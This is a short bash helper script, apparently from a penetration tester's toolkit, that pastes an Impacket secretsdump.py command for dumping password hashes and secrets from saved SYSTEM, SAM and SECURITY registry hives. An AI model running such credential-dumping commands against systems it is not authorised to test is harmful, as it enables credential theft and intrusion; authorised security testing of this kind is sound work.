#!/bin/bash

"""
Impacket: Local secretsdump using SYSTEM, SAM, and SECURITY hives.
"""

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE"